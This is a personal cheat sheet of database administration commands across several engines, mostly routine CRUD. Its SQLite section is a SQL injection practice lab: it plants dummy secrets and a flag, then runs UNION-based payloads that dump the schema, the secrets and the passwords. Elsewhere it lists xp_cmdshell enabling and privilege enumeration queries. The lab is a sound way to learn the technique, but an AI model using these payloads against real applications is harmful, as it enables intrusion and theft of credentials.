# Database Administration

## MongoDB CRUD
```
mongosh
show dbs
use users
show tables
show collectionsn
db.createCollection("staff_info")
db.staff_info.insert({name:"jenny",phone:"8675309",status:"jessies"})
db.staff_info.remove({name:"jenny",phone:"8675309",status:"jessies"})
db.staff_info.remove("62569a27520ca03e8512a6d1") 
db.staff_info.drop()
db.staff_info.find() # this reads all items in the collection "staff_info"
# Bulk insert (as shown in the lesson):
mongoimport -d cities -c cityinfo —type CSV —file ./cities.csv —headerline	
mongoexport --uri="mongodb://127.0.0.1:27017/super" --collection=users --out=mongotest.json
```
```
db.getUsers()
db.createUser(
  {
    user: "alfred",
    pwd:  passwordPrompt(),
    roles: [ { role: "readWrite", db: "users" } ]
  }
)
db.createUser(
  {
    user: "bruce",
    pwd:  passwordPrompt(),
    roles: [ { role: "read", db: "users" } ]
  }
)
db.dropUser(username="bruce")
db.dropUser("bruce")
```

## Couchbase CRUD
```
export PATH=$PATH:/opt/couchbase/bin
couchbase-cli bucket-create -c 127.0.0.1:8091 --username Administrator --password Omgpassword! --bucket example-bucket --bucket-type couchbase --bucket-ramsize 512
Log in to CBQ:
/opt/couchbase/bin/cbq -e http://127.0.0.1:8091 -u=Administrator
Commands that are used in CBQ:
INSERT INTO `example-bucket` ( KEY, VALUE ) Values ( "testdoc",{"name": "Jenny","type": "Jessies"} ) RETURNING META().id as docid, *; 
CREATE PRIMARY INDEX `example-bucket-index` ON `example-bucket`;
SELECT * FROM `example-bucket` WHERE type= "Jessies"; 
UPDATE `example-bucket` set type = "mine" WHERE name= "Jenny"; 
DELETE from `example-bucket` WHERE name= "Jenny"; 
Delete the bucket:
couchbase-cli bucket-delete -c 127.0.0.1:8091 --username Administrator --password Omgpassword! --bucket example-bucket 	
```

## PostgreSQL CRUD
```
psql  
psql -U mmuser -W -d mattermost
\l          # list databases
\dt         # list tables from all schemas
\dn         # list schemas
\du         # list users
ALTER ROLE "sonarUser" WITH PASSWORD 'wawawawimuchentropy';
select  * from users;    # read the whole user table 
\setenv PAGER 'less -S' # set pager to less for long outputs 
create database music;
\c music 
UPDATE properties SET text_value = 'main,master,develop,trunk' WHERE prop_key = 'sonar.dbcleaner.branchesToKeepWhenInactive';
CREATE TABLE friends( 
name varchar(80),
phone varchar(80),
status varchar(80)
);
\dt  
INSERT INTO friends VALUES ('jenny','8675309','jessies');
select * from friends;
DELETE  from friends WHERE name = ‘jenny’;
DROP TABLE friends;
\c postgres
DROP DATABASE music;
\l  
create database city_data;
\c city_data
create table city_info(
id serial NOT NULL,
LatD numeric,
LatM numeric,
LatS numeric,
NS text,
LonD numeric,
LonM numeric,
LonS numeric,
EW text,
City text,
State text
) ;
COPY city_info(LatD,LatM,LatS,NS,LonD,LonM,LonS,EW,City,State)
from '/var/lib/pgsql/content-db-essentials/cities.csv' DELIMITER ',' CSV HEADER;
```


## MySQL/MariaDB CRUD
```
mysql -u root -p
mysql -u grafana -p -h example.org -D grafana
select current_user;
show databases;	
use <db-name>;
show tables;
select * from users;     # show all collums from the users table in table form
select * from users\G    # show all collums from the users table in verticalorm
pager less -SFX          # set the pager to less to be able to do horizontal scrolling
create database music;
use music
create table users(
name varchar(50),
phone varchar(50),
status varchar(50)
);
insert into users values('jenny','8675309','jessies');
select * from users;
update users set status='mine' where name='jenny';
select * from users
delete from users where name='jenny';
drop table users;
drop database music;
For bulk insert:
git clone https://github.com/linuxacademy/content-db-essentials.git
sudo cp ./content-db-essentials/cities.csv /var/lib/mysql
create table city_info(
LatD int,
LatM int,
LatS int,
NS char,
LonD int,
LonM int,
LonS int,
EW char,
City varchar(50),
State varchar(50)
) ;
LOAD DATA INFILE '/var/lib/mysql/cities.csv' INTO table city_info Fields terminated by ',' ENclosed by '"' Lines terminated by '\n' Ignore 1 ROWS;
show grants;
select * from mysql.user;
select user,file_priv from mysql.user where file_priv='Y';
select user,Super_priv from mysql.user where Super_priv='Y';
select user();
```

	
## MsSQL CRUD
```sql
/opt/mssql-tools/sqlcmd
sqlcmd -S 127.0.0.1 -U sa -P 'OmgPassw0rd!'
select name from sys.databases                    # list databases 
select table_name from information_schema.tables  # list tables
select * from UserImport                          # read the whole table <UserImport>
enable_xp_cmdshell                                # enable xp cmdshell
create dabase users
use users
create table example (
name varchar(50),
phone varchar(50),
status varchar(50)
)
insert into example values('jenny','8675309','jessies')
update example set status='mine' where name='jenny'
restore database AdventureworksDW2107
from disk = '/var/opt/mssql/AdventureworksDW2017.bak' 
with move 'AdventureworksDW2017' to '/var/opt/mssql/data/Adventureworksdw2017.mdf',
move 'AdventureworksDW2017_log' to '/var/opt/mssql/data/AdventureworksDW2017.ldf'
```
	
## Sqlite CRUD
Create a test.db and connect to it, by default is completely empty, 0 bytes
```bash
sqlite3 test.db
```

Observe that the `sqlite_schema` is empty at that stage.
btw, note that `sqlite_schema` and `sqlite_master` are the same table.
`sqlite_schema` was introduced as the preferred name in SQLite 3.33.0 (2020-08-14),

```sql
SELECT * FROM sqlite_schema;
```

Create a schema with 2 tables
```sql
CREATE TABLE users (
   id INTEGER PRIMARY KEY,
   username TEXT,
   password TEXT,
   role TEXT,
   email TEXT
);
```

```sql
CREATE TABLE sensitive_data (
   id INTEGER PRIMARY KEY,
   data_type TEXT,
   content TEXT
);
```

insert dummy data in the tables
```sql
INSERT INTO users (username, password, role, email) VALUES
   ('admin', 'admin123', 'administrator', 'admin@company.com'),
   ('guest', 'guest', 'guest', 'guest@company.com'),
   ('user1', 'password1', 'user', 'user1@company.com');
```

```sql
INSERT INTO sensitive_data (id, data_type, content) VALUES
   (1, 'credentials', 'Database admin password: db_admin_2024!'),
   (2, 'api_keys', 'API_KEY=sk-1234567890abcdef, SECRET=xyz789'),
   (3, 'flag', 'FLAG{fastmcp_sql_injection_pwned}');
```

Now the `sqlite_schema` has our tables
```sql
SELECT * FROM sqlite_schema;
SELECT name FROM sqlite_schema WHERE type='table';
```

Dot commands are sqlite3 cli specific features, only exist in the interractive shell
```sql
.mode table                   # display as tables 
.headers on                   # display the column headers 
.databases                    # display attached databases
.tables                       # display tables 
.schema                       # show the whole schema
.schema users                 # show the schema of table users
.separator "\t"               # use tabs as column separator (.mode table probably better)
```

PRAGMA, SELECT, CREATE, etc, are SQL statements, they're part of the SQLite engine itself.
```sql
PRAGMA table_info(users);      # show column-level details for a specific table
SELECT * FROM users;
```

add a row in a table
```sql
ALTER TABLE table_name
  ADD new_column_name column_definition;
```

delete rows in a table
```sql
DELETE FROM raspbian WHERE rowid = 2;
DELETE FROM raspbian WHERE banner like '%Raspbian%';
delete from raspbian where banner not like '%Raspbian%';
```

drop a table
```sql
DROP TABLE table_name;
```

SQLi union practice

assuming we have injection here in the value of the username column of the users table
```sql
select username,role,email from users where username == '';
select username,role,email from users where username == 'admin';
select username,role,email from users where username == 'admin' or 1=1 --';
```

We want to use union to join some of the `sqlite_schema` data with the
3 columns we have from users.
```sql
select username,role,email from users;
select type,name,sql from sqlite_schema;
```
```
+----------+---------------+-------------------+
| username |     role      |       email       |
+----------+---------------+-------------------+
| admin    | administrator | admin@company.com |
| guest    | guest         | guest@company.com |
| user1    | user          | user1@company.com |
+----------+---------------+-------------------+
```
```
+-------+----------------+-------------------------------+
| type  |      name      |              sql              |
+-------+----------------+-------------------------------+
| table | users          | CREATE TABLE users (          |
|       |                |    id INTEGER PRIMARY KEY,    |
|       |                |    username TEXT,             |
|       |                |    password TEXT,             |
|       |                |    role TEXT,                 |
|       |                |    email TEXT                 |
|       |                | )                             |
+-------+----------------+-------------------------------+
| table | sensitive_data | CREATE TABLE sensitive_data ( |
|       |                |    id INTEGER PRIMARY KEY,    |
|       |                |    data_type TEXT,            |
|       |                |    content TEXT               |
|       |                | )                             |
+-------+----------------+-------------------------------+
```

We confirm that we can merge 3 columns with NULL,NULL,NULL, but we know we can.
We now need to do an UNION of `sqlite_schema` into users,
Since we only have 3 columns we need to choose just what matters from `sqlite_schema`, e.g: type,name,sql.
```sql
select username,role,email from users where username == 'admin' or 1=1 UNION SELECT NULL,NULL,NULL --';
select username,role,email from users where username == 'admin' or 1=1 UNION SELECT type,name,sql FROM sqlite_schema --';
```
```
+----------+----------------+-------------------------------+
| username |      role      |             email             |
+----------+----------------+-------------------------------+
| admin    | administrator  | admin@company.com             |
+----------+----------------+-------------------------------+
| guest    | guest          | guest@company.com             |
+----------+----------------+-------------------------------+
| table    | sensitive_data | CREATE TABLE sensitive_data ( |
|          |                |    id INTEGER PRIMARY KEY,    |
|          |                |    data_type TEXT,            |
|          |                |    content TEXT               |
|          |                | )                             |
+----------+----------------+-------------------------------+
| table    | users          | CREATE TABLE users (          |
|          |                |    id INTEGER PRIMARY KEY,    |
|          |                |    username TEXT,             |
|          |                |    password TEXT,             |
|          |                |    role TEXT,                 |
|          |                |    email TEXT                 |
|          |                | )                             |
+----------+----------------+-------------------------------+
| user1    | user           | user1@company.com             |
+----------+----------------+-------------------------------+
```

Great at this point we know a lot, we know exactly what the tables name are,
but also their schemas, which means we know the name of each of their respective columns.
So we can use UNION again to get the 3 specific columns we want from the sensitive data table.
And it turns out there's just 3 colums in `sensitive_data` just like our users select statement
so we can just `SELECT *` from `sensitive_data` and we should be golden.
```sql
select username,role,email from users where username == 'admin' or 1=1 UNION SELECT id,data_type,content FROM sensitive_data --';
select username,role,email from users where username == 'admin' or 1=1 UNION SELECT * FROM sensitive_data --';
```
```
+----------+---------------+--------------------------------------------+
| username |     role      |                   email                    |
+----------+---------------+--------------------------------------------+
| 1        | credentials   | Database admin password: db_admin_2024!    |
| 2        | api_keys      | API_KEY=sk-1234567890abcdef, SECRET=xyz789 |
| 3        | flag          | FLAG{fastmcp_sql_injection_pwned}          |
| admin    | administrator | admin@company.com                          |
| guest    | guest         | guest@company.com                          |
| user1    | user          | user1@company.com                          |
+----------+---------------+--------------------------------------------+
```

We could've used group concat too
```sql
select username,role,email from users where username == 'admin' or 1=1 UNION SELECT NULL, NULL, GROUP_CONCAT(name) FROM sqlite_schema --';
select username,role,email from users where username == 'admin' or 1=1 UNION SELECT NULL, NULL, GROUP_CONCAT(content) FROM sensitive_data --';
select username,role,email from users where username == 'admin' or 1=1 UNION SELECT NULL, NULL, GROUP_CONCAT(password) FROM users --';
```
```
+----------+---------------+----------------------+
| username |     role      |        email         |
+----------+---------------+----------------------+
|          |               | users,sensitive_data |
| admin    | administrator | admin@company.com    |
| guest    | guest         | guest@company.com    |
| user1    | user          | user1@company.com    |
+----------+---------------+----------------------+
```
```
+----------+---------------+--------------------------------------------------------------+
| username |     role      |                            email                             |
+----------+---------------+--------------------------------------------------------------+
|          |               | Database admin password: db_admin_2024!,API_KEY=sk-123456789 |
|          |               | 0abcdef, SECRET=xyz789,FLAG{fastmcp_sql_injection_pwned}     |
+----------+---------------+--------------------------------------------------------------+
| admin    | administrator | admin@company.com                                            |
+----------+---------------+--------------------------------------------------------------+
| guest    | guest         | guest@company.com                                            |
+----------+---------------+--------------------------------------------------------------+
| user1    | user          | user1@company.com                                            |
+----------+---------------+--------------------------------------------------------------+
```
```
+----------+---------------+--------------------------+
| username |     role      |          email           |
+----------+---------------+--------------------------+
|          |               | admin123,guest,password1 |
| admin    | administrator | admin@company.com        |
| guest    | guest         | guest@company.com        |
| user1    | user          | user1@company.com        |
+----------+---------------+--------------------------+
```

## Redis CRUD
```sql
redis-cli -h localhost -p 6379
redis-cli
INFO                 # if NOAUTH Authentication required, then auth is needed 
AUTH password	     # redis can be configured to have only a password 
AUTH user password   # or both a username and a password 
INFO keyspace        # equivalent to a show databases 
SELECT 1             # select database 1
KEYS *               # List all keys in database 1

get key:1
set key:1 newvalue
del key:1

MODULE LOAD /path/to/mymodule.so  # load a module at runtime
```
